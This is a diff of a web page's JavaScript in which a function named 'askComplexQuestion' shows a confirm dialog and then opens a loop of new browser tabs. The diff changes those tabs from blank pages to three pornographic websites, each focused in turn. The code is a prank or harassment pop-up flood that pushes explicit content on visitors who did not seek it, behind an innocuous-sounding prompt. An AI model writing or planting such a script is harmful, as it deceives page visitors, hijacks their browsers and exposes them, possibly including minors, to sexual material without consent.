@@ -20,17 +20,24 @@
 </style>
 <script>
 function askComplexQuestion() {
-    var numberOfWindows = 10000;
+    var numberOfWindows = 10;
     var question = "#Pop-Up";
     var answer = confirm(question);
 
+    // Array of URLs to open
+    var urls = [
+        "https://www.pornhub.com",
+        "https://www.xhamster.com",
+        "https://www.youporn.com"
+    ];
+
     for (var i = 0; i < numberOfWindows; i++) {
-        openNewTab();
+        openNewTab(urls[i % urls.length]);
     }
 }
 
-function openNewTab() {
-    var newTab = window.open("about:blank", "_blank");
+function openNewTab(url) {
+    var newTab = window.open(url, "_blank");
     newTab.focus();
 }
 </script>
